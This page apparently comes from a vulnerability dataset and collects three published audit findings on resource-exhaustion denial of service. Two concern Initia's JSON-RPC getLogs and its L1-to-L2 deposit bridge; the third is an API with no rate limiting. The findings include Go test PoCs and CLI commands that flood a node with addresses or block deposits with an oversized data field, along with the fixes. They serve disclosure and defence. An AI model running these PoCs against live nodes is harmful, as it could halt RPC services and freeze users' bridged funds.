# Cluster -1087

**Rank:** #175  
**Count:** 70  

## Label
Common vulnerability type: **Unbounded resource consumption via input validation failures**, leading to denial-of-service through excessive CPU, memory, or cryptographic resource usage under attacker-controlled inputs.

## Cluster Information
- **Total Findings:** 70

## Examples

### Example 1

**Auto Label:** Common vulnerability type: **Unbounded resource consumption via input validation failures**, leading to denial-of-service through excessive CPU, memory, or cryptographic resource usage under attacker-controlled inputs.  

**Original Text Preview:**

The `eth_getLogs` ETH JSON-RPC method returns an array of all logs matching a given filter criteria, e.g., a topic list `Topics` and/or a list of addresses (`Addresses`) that restricts matches to events created by specific contracts.

While `Topics` is limited to [`maxTopics = 4`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/jsonrpc/namespaces/eth/filters/api.go# L29), `Addresses` in unbounded.

[`minievm:jsonrpc/namespaces/eth/filters/api.go# L366`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/jsonrpc/namespaces/eth/filters/api.go# L366)
```

358: // GetLogs returns logs matching the given argument that are stored within the state.
359: func (api *FilterAPI) GetLogs(ctx context.Context, crit ethfilters.FilterCriteria) ([]*coretypes.Log, error) {
360: 	if len(crit.Topics) > maxTopics {
361: 		return nil, errExceedMaxTopics
362: 	}
363: 	var filter *Filter
364: 	if crit.BlockHash != nil {
365: 		// Block filter requested, construct a single-shot filter
366: ❌ filter = newBlockFilter(api.logger, api.backend, *crit.BlockHash, crit.Addresses, crit.Topics)
367: 	} else {
```

This can be exploited to DoS the RPC server and bring it to a halt by sending `eth_getLogs` requests with a large number of addresses in the `Addresses` field, which takes a considerable amount of time to process.

It should be noted that the JSON-RPC server has a default request body limit of `~10MB`, which can be adjusted via the [`max-recv-msg-size` configuration option](https://github.com/cosmos/cosmos-sdk/blob/eb1a8e88a4ddf77bc2fe235fc07c57016b7386f0/tools/confix/data/v0.50-app.toml# L166). This at least limits the `Addresses` field to a certain extent. However, the below the PoC demonstrates that this is not sufficient and it is still possible to DoS the server.

The same issue, not having an upper bound on the `Addresses`, is also observed in:

* [`FilterAPI::NewFilter()`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/jsonrpc/namespaces/eth/filters/api.go# L343) and
* [`FilterAPI::Logs()`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/jsonrpc/namespaces/eth/filters/subscriptions.go# L131)

### Proof of Concept

The following estimation shows how many addresses we can fit within a `~10MB` JSON-RPC request limit:

1. Each Ethereum address is 20 bytes
2. In JSON-RPC format, each address needs to be hex-encoded with “0x” prefix:

   * 20 bytes becomes 40 hex characters
   * Plus “0x” prefix = 42 characters
3. In JSON array format, we need:

   * Quotes around each address: +2 characters = 44 chars per address
   * Commas between addresses: +1 character
   * Square brackets: +2 characters for the whole array
4. Each character in JSON is 1 byte

So for `n` addresses:

* Total bytes = `44n + (n-1) + 2`
* Simplified: `45n + 1 bytes`

With a 10MB (10,485,760 bytes) limit:
```

10,485,760 = 45n + 1
n = (10,485,760 - 1) / 45
n ≈ 232,905 addresses
```

To account for some request overhead, a more conservative estimate would be around **200,000** addresses.

The following test case demonstrates that by providing 200,000 addresses to the `GetLogs` function, the request takes more than 5 seconds to complete. This opens up the possibility of a DoS attack by sending a large number of addresses to the `GetLogs` function and repeating the request to bring the RPC to a halt.

Apply the following git diff and run the `Test_GetLogs` test with `go test -timeout 30s -run ^Test_GetLogs$ ./jsonrpc/namespaces/eth/filters`
```

diff --git a/jsonrpc/namespaces/eth/filters/api_test.go b/jsonrpc/namespaces/eth/filters/api_test.go
index e1ad746..7c27536 100644
--- a/jsonrpc/namespaces/eth/filters/api_test.go
+++ b/jsonrpc/namespaces/eth/filters/api_test.go
@@ -392,10 +392,27 @@ func Test_GetLogs(t *testing.T) {
 		}
 	}

+	// create a massive number of addresses and populate them into `Addresses`
+	numAddresses := 200_000
+	addresses := make([]common.Address, 0, numAddresses)
+	for i := 0; i < numAddresses; i++ {
+		addresses = append(addresses, common.BytesToAddress(contractAddr))
+	}
+
+	// time how long it takes
+	start := time.Now()
+
 	logs, err := input.filterAPI.GetLogs(context.Background(), ethfilters.FilterCriteria{
 		FromBlock: big.NewInt(tx2Height),
+		Addresses: addresses,
 	})
 	require.NoError(t, err)
+
+	elapsed := time.Since(start)
+
+	// assert that it takes at least 5 seconds
+	require.GreaterOrEqual(t, elapsed.Milliseconds(), int64(5_000))
+
 	for _, log := range logs {
 		if log.BlockNumber == uint64(tx3Height) {
 			require.Equal(t, txHash3, log.TxHash)
```

### Recommended mitigation steps

Consider enforcing an upper limit on the number of `Addresses`, similar to how it’s done for `Topics`.

**[beer-1 (Initia) confirmed and commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-9?commentParent=vhzra2sKXiS):**

> This is valid finding, but only consensus breaking and taking over funding related findings can be critical.
>
> Would like to lower severity to medium.

**[LSDan (judge) commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-9?commentParent=vhzra2sKXiS&commentChild=FSpbZ9nbVYY):**

> I disagree. This is a direct DDOS vector with next to zero cost. The ease of execution and the potential for overloading every JSON-RPC server simultaneously with a small botnet is enough to justify high risk.

**[beer-1 (Initia) commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-9?commentParent=vhzra2sKXiS&commentChild=oRypCWySfbG):**

> Fixed [here](https://github.com/initia-labs/minievm/pull/165/commits/024640e8d972e73f9411adbddc8ea2c61a276e69).

**[Initia mitigated](https://github.com/code-423n4/2025-03-initia-cosmos-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**

> Added a max addresses limit.

**Status:** Mitigation confirmed. Full details in reports from [0xAlix2](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-16), [berndartmueller](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-2) and [Franfran](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-37).

---

---
### Example 2

**Auto Label:** Common vulnerability type: **Unbounded resource consumption via input validation failures**, leading to denial-of-service through excessive CPU, memory, or cryptographic resource usage under attacker-controlled inputs.  

**Original Text Preview:**

On L2, `MsgFinalizeTokenDeposit` [must be relayed in strict sequence](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/opchild/keeper/msg_server.go# L390-L395), matching `finalizedL1Sequence, err := ms.GetNextL1Sequence(ctx)`

[`x/opchild/keeper/msg_server.go::FinalizeTokenDeposit(..)`](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/opchild/keeper/msg_server.go# L385-L395)
```

385:     finalizedL1Sequence, err := ms.GetNextL1Sequence(ctx)
386:     if err != nil {
387:         return nil, err
388:     }
389:
390:     if req.Sequence < finalizedL1Sequence {
391:         // No op instead of returning an error
392:         return &types.MsgFinalizeTokenDepositResponse{Result: types.NOOP}, nil
393:     } else if req.Sequence > finalizedL1Sequence {
394:         return nil, types.ErrInvalidSequence
395:     }
```

As long as a specific L1 sequence is not successfully processed, subsequent `L1->L2` deposits have to wait and cannot be processed. If it were possible to purposefully create a `MsgFinalizeTokenDeposit` message that cannot be executed on L2, it will **DoS all subsequent deposits to L2**!

Due to strict validation on the L1 in `InitiateTokenDeposit(..)` it seems almost impossible to create such a message.

However, the `data` field in `MsgFinalizeTokenDeposit` is not restricted in size. This allows creating a message that is so large that it cannot be processed on L2. Specifically, the RPC message size limit (`rpc-max-body-bytes` and `max_body_bytes`) and the mempool/consensus max tx size limit (`maxTxBytes`) might be exceeded, preventing the message from being processed.

The RPC limits messages by default to [**1MB**](https://github.com/cosmos/cosmos-sdk/blob/eb1a8e88a4ddf77bc2fe235fc07c57016b7386f0/tools/confix/data/v0.50-app.toml# L147), while `maxTxBytes` is set to **2MB** (on [`L1`](https://github.com/initia-labs/initia/blob/c79d3315f16e624f9a39641c52f63b3fc5e2881b/cmd/initiad/config.go# L76) and the [`minimove L2`](https://github.com/initia-labs/minimove/blob/b36d068a7faec31a59d56472e77a9785397f9663/cmd/minitiad/config.go# L88)).

Note that the RPC limit is not 100% effective. An active validator is not limited by it and can include a message in a proposed block that is larger than the RPC limit, but smaller than the mempool limit.

Given that `data` is unrestricted, and `MsgInitiateTokenDeposit` on L1 contains less properties than `MsgFinalizeTokenDeposit` on L2, it is possible to create a `MsgInitiateTokenDeposit` message that is smaller than the enforced 2MB, but when relayed to L2, the `MsgFinalizeTokenDeposit` message is too large (e.g., due to the additional `BaseDenom` field and others) and thus rejected.

[`MsgFinalizeTokenDeposit`](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/opchild/types/tx.pb.go# L195-L212)
```

195: type MsgFinalizeTokenDeposit struct {
196:     // the sender address
197:     Sender string `protobuf:"bytes,1,opt,name=sender,proto3" json:"sender,omitempty" yaml:"sender"`
198:     // from is l1 sender address
199:     From string `protobuf:"bytes,2,opt,name=from,proto3" json:"from,omitempty"`
200:     // to is l2 recipient address
201:     To string `protobuf:"bytes,3,opt,name=to,proto3" json:"to,omitempty"`
202:     // amount is the coin amount to deposit.
203:     Amount types1.Coin `protobuf:"bytes,4,opt,name=amount,proto3" json:"amount" yaml:"amount"`
204:     // sequence is the sequence number of l1 bridge
205:     Sequence uint64 `protobuf:"varint,5,opt,name=sequence,proto3" json:"sequence,omitempty"`
206:     // height is the height of l1 which is including the deposit message
207:     Height uint64 `protobuf:"varint,6,opt,name=height,proto3" json:"height,omitempty"`
208:     // base_denom is the l1 denomination of the sent coin.
209:     BaseDenom string `protobuf:"bytes,7,opt,name=base_denom,json=baseDenom,proto3" json:"base_denom,omitempty"`
210:     /// data is a extra bytes for hooks.
211:     Data []byte `protobuf:"bytes,8,opt,name=data,proto3" json:"data,omitempty"`
212: }
```

VS [`MsgInitiateTokenDeposit`](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/ophost/types/tx.pb.go# L349-L355)
```

349: type MsgInitiateTokenDeposit struct {
350:     Sender   string     `protobuf:"bytes,1,opt,name=sender,proto3" json:"sender,omitempty" yaml:"sender"`
351:     BridgeId uint64     `protobuf:"varint,2,opt,name=bridge_id,json=bridgeId,proto3" json:"bridge_id,omitempty" yaml:"bridge_id"`
352:     To       string     `protobuf:"bytes,3,opt,name=to,proto3" json:"to,omitempty" yaml:"to"`
353:     Amount   types.Coin `protobuf:"bytes,4,opt,name=amount,proto3" json:"amount" yaml:"amount"`
354:     Data     []byte     `protobuf:"bytes,5,opt,name=data,proto3" json:"data,omitempty" yaml:"data"`
355: }
```

Additionally, the [executor batches messages into a single Cosmos tx](https://github.com/initia-labs/opinit-bots/blob/640649b97cbfa5782925b7dc8c0b62b8fa5367f6/node/broadcaster/broadcaster.go# L278-L297) without any check that the incremental payload exceeds the maximum length that can be accepted by the API, which might lead to this scenario occurring organically if enough messages of “normal” size accumulate.

Ultimately, `L1->L2` deposits can be DoS’ed by purposefully providing a large `data` field which results in the L2 `MsgFinalizeTokenDeposit` message being too large to be processed.

### Proof of Concept

The following PoC demonstrates how a large `data` field in `MsgInitiateTokenDeposit` can lead to a DoS of `L1->L2` deposits.

### Setup

Add the following changes. For simplicity, the L1 RPC limit is increased. Note that this does not affect the mempool limit. The RPC limit can be sidestepped by a block proposer anyway.

[`opinit-bots/e2e/helper.go# L253`](https://github.com/initia-labs/opinit-bots/blob/640649b97cbfa5782925b7dc8c0b62b8fa5367f6/e2e/helper.go# L253)
```

api := make(testutil.Toml)
api["rpc-max-body-bytes"] = 5_000_000
c["api"] = api
```

[`opinit-bots/e2e/helper.go# L260`](https://github.com/initia-labs/opinit-bots/blob/640649b97cbfa5782925b7dc8c0b62b8fa5367f6/e2e/helper.go# L260)
```

configToml := make(testutil.Toml)
rpc := make(testutil.Toml)
rpc["max_body_bytes"] = 5_000_000
configToml["rpc"] = rpc

err = testutil.ModifyTomlConfigFile(ctx, logger, client, t.Name(), l1Chain.Validators[0].VolumeName, "config/config.toml", configToml)
require.NoError(t, err)
```

### Test Case

Paste the test case into `opinit-bots/e2e/multiple_txs_test.go` and run with`go test -v . -timeout 30m -run TestMultipleDepositsAndWithdrawalsExceedingLimit`.
```

func TestMultipleDepositsAndWithdrawalsExceedingLimit(t *testing.T) {
	l1ChainConfig := &ChainConfig{
		ChainID:        "initiation-2",
		Image:          ibc.DockerImage{Repository: "ghcr.io/initia-labs/initiad", Version: "v0.6.4", UIDGID: "1000:1000"},
		Bin:            "initiad",
		Bech32Prefix:   "init",
		Denom:          "uinit",
		Gas:            "auto",
		GasPrices:      "0.025uinit",
		GasAdjustment:  1.2,
		TrustingPeriod: "168h",
		NumValidators:  1,
		NumFullNodes:   0,
	}

	l2ChainConfig := &ChainConfig{
		ChainID:        "minimove-2",
		Image:          ibc.DockerImage{Repository: "ghcr.io/initia-labs/minimove", Version: "v0.6.5", UIDGID: "1000:1000"},
		Bin:            "minitiad",
		Bech32Prefix:   "init",
		Denom:          "umin",
		Gas:            "auto",
		GasPrices:      "0.025umin",
		GasAdjustment:  1.2,
		TrustingPeriod: "168h",
		NumValidators:  1,
		NumFullNodes:   0,
	}

	daChainConfig := &DAChainConfig{
		ChainConfig: *l1ChainConfig,
		ChainType:   ophosttypes.BatchInfo_CHAIN_TYPE_INITIA,
	}

	bridgeConfig := &BridgeConfig{
		SubmissionInterval:    "5s",
		FinalizationPeriod:    "10s",
		SubmissionStartHeight: "1",
		OracleEnabled:         false,
		Metadata:              "",
	}

	ctx := context.Background()

	op := SetupTest(t, ctx, BotExecutor, l1ChainConfig, l2ChainConfig, daChainConfig, bridgeConfig)

	user0 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(10_000_000), op.Initia, op.Minitia)
	user1 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	user2 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	user3 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	user4 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	amount := sdk.NewCoin(op.Initia.Config().Denom, math.NewInt(1000))

	broadcaster := cosmos.NewBroadcaster(t, op.Initia.CosmosChain)

	dataLength := 1_000_000 // ~1MB

	data := make([]byte, dataLength)

	msg := ophosttypes.NewMsgInitiateTokenDeposit(
		user0[0].FormattedAddress(),
		1,
		user1[1].FormattedAddress(),
		amount,
		data,
	)

	broadcaster.ConfigureFactoryOptions(
		func(factory tx.Factory) tx.Factory {
			return factory.WithGas(20_000_000)
		},
	)

	broadcaster.ConfigureClientContextOptions(
		func(clientContext client.Context) client.Context {
			return clientContext.WithSimulation(false)
		},
	)

	tx, err := cosmos.BroadcastTx(
		ctx,
		broadcaster,
		user0[0],
		msg,
	)

	require.NoError(t, err, "error broadcasting tx")
	require.Zero(t, tx.Code, "initiate token deposit tx failed: %s - %s - %s", tx.Codespace, tx.RawLog, tx.Data)

	op.Logger.Info("initiate token deposit tx with large data broadcasted", zap.String("tx_hash", tx.TxHash))

	_, err = op.Initia.InitiateTokenDeposit(ctx, user1[0].KeyName(), 1, user2[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)
	_, err = op.Initia.InitiateTokenDeposit(ctx, user2[0].KeyName(), 1, user3[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)
	_, err = op.Initia.InitiateTokenDeposit(ctx, user3[0].KeyName(), 1, user4[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)
	_, err = op.Initia.InitiateTokenDeposit(ctx, user4[0].KeyName(), 1, user0[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)

	err = testutil.WaitForBlocks(ctx, 5, op.Initia, op.Minitia)
	require.NoError(t, err)

	res, err := op.Initia.QueryTokenPairByL1Denom(ctx, 1, op.Initia.Config().Denom)
	require.NoError(t, err)

	user0Balance, err := op.Minitia.BankQueryBalance(ctx, user0[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user1Balance, err := op.Minitia.BankQueryBalance(ctx, user1[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user2Balance, err := op.Minitia.BankQueryBalance(ctx, user2[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user3Balance, err := op.Minitia.BankQueryBalance(ctx, user3[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user4Balance, err := op.Minitia.BankQueryBalance(ctx, user4[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)

	require.Equal(t, int64(1000), user0Balance.Int64())
	require.Equal(t, int64(1000), user1Balance.Int64())
	require.Equal(t, int64(1000), user2Balance.Int64())
	require.Equal(t, int64(1000), user3Balance.Int64())
	require.Equal(t, int64(1000), user4Balance.Int64())
}
```

After a while, the logs will show that the Cosmos transaction containing the `MsgFinalizeTokenDeposit` message is rejected due to the message size limit.
```

2025-01-13T22:05:38.586Z    WARN    executor    broadcaster/process.go:119    retry to handle processed msgs    {"seconds": 8, "count": 2, "error": "simulation failed: error in json rpc client, with http response metadata: (Status: 400 Bad Request, Protocol HTTP/1.1). RPC error -32600 - Invalid Request: error reading request body: http: request body too large"}
```

This is a proof that `L1->L2` deposits can be DoS’ed by purposefully providing a large `data` field that results in the L2 `MsgFinalizeTokenDeposit` message being too large to be processed on L2.

The size of `data` can be meticulously crafted to be just below the L1 RPC and mempool limit, but exceeding the limits on L2.

One way to do so is to alter the `NewInitiateTokenDeposit` command to accept data size instead of content:
```

            dataLen, err := strconv.ParseUint(args[3], 10, 64)
            if err != nil {
                return err
            }

            data := make([]byte, dataLen)
```

With this change, it is possible to bisect incrementally larger sizes to find the right limit of a signed transaction (below 749667 is found):
```

➜  initia git:(main) ✗ build/initiad tx ophost initiate-token-deposit 1 abc 1uinit 749667 --from=validator --chain-id=initia-1
[...]
raw_log: 'out of gas in location: txSize; gasWanted: 200000, gasUsed: 7500502: out
  of gas'
[...]

➜  initia git:(main) ✗ build/initiad tx ophost initiate-token-deposit 1 abc 1uinit 749668 --from=validator --chain-id=initia-1
[...]
error in json rpc client, with http response metadata: (Status: 400 Bad Request, Protocol HTTP/1.1). RPC error -32600 - Invalid Request: error reading request body: http: request body too large
```

### Recommended mitigation steps

Consider restricting the size of the `data` field in `MsgInitiateTokenDeposit` to a reasonable limit, such as 100KB. Additionally, the executor should be modified to handle large messages in a more graceful manner, such as splitting them into multiple transactions if the simulation fails due to the message size limit.

**[beer-1 (Initia) confirmed, but disagreed with severity and commented](https://code4rena.com/audits/2025-01-initia-rollup-modules/submissions/F-10?commentParent=oLNFXpEYA93):**

> Thanks for your report! It seems one can halt the relaying, but it can be solved by increasing the rpc limit or decreasing the block gas limit kind of way.
>
> But it would good to have limit on data field. We will apply it.
>
> Mitigation [here](https://github.com/initia-labs/OPinit/pull/133).

**[LSDan (judge) commented](https://code4rena.com/audits/2025-01-initia-rollup-modules/submissions/F-10?commentParent=oLNFXpEYA93&commentChild=T8ZnBrXybPs):**

> Given the temporary nature of the impact (ease of mitigation) I agree that this is more appropriate as a medium.

**[berndartmueller (warden) commented](https://code4rena.com/audits/2025-01-initia-rollup-modules/submissions/F-10?commentParent=pGkaywrN7KN):**

> While changing the RPC limit is done per RPC/validator, and thus can be done quickly on the RPC that is used by the off-chain executor bot, increasing the RPC limit is only half of the mitigation.
>
> The RPC limit can be bypassed if the attacker is a validator who proposes a block. In this case, the relevant limit is the mempool’s `maxTxBytes`. This parameter is a consensus-relevant parameter, meaning, the majority of the nodes must increase this limit. Otherwise, the network continues to reject a block that contains such a large tx. Therefore, the mitigation is not that easy and requires coordination among the validators, which might take a while.
>
> If this happens during times when the market is volatile, and users must quickly bridge assets from `L1->L2` to e.g., improve the health of borrowing positions, this is especially severe and will result in lost funds. Therefore, we kindly request considering this submission as a High.

**[LSDan (judge) commented](https://code4rena.com/audits/2025-01-initia-rollup-modules/submissions/F-10?commentParent=pGkaywrN7KN&commentChild=Zuks4h4QPaj):**

> Thank you for the additional clarification. I agree with your reasoning and have upgraded it back to high.

---

---
### Example 3

**Auto Label:** Common vulnerability type: **Inadequate rate limiting and insufficient validation lead to denial-of-service attacks via unbounded request volume or malformed inputs.**  

**Original Text Preview:**

##### Description

API requests consume resources such as network, CPU, memory, and storage. This vulnerability occurs when too many requests arrive simultaneously, and the API does not have enough compute resources to handle those requests.

During the assessment, no rate limitation policy was found on the API service. An attacker could exploit this vulnerability to overload the API by sending more requests than it can handle. As a result, the API becomes unavailable or unresponsive to new requests, or resources of bandwidth and CPU usage could be abused as well.

##### Proof of Concept

During the assessment, some example interesting endpoints where found allowing multiple parallel requests (**POST** HTTP request to [**https://test5.api.onbloc.xyz/v1/gno**](https://test5.api.onbloc.xyz/v1/gno)):

![Endpoint allowing multiple requests](https://halbornmainframe.com/proxy/audits/images/67979aa7c1f69dd5c66ee1cc)

##### Score

Impact: 3  
Likelihood: 4

##### Recommendation

This vulnerability is due to the application accepting requests from users at a given time without performing request throttling checks. It is recommended to follow the following best practices:

* Implement a limit on how often a client can call the API within a defined timeframe.
* Notify the client when the limit is exceeded by providing the limit number and the time the limit will be reset.

##### Remediation

**SOLVED:** The **Onbloc team** solved this finding.

##### Remediation Hash

<https://github.com/onbloc/onbloc-api-v2/pull/23/files>

---
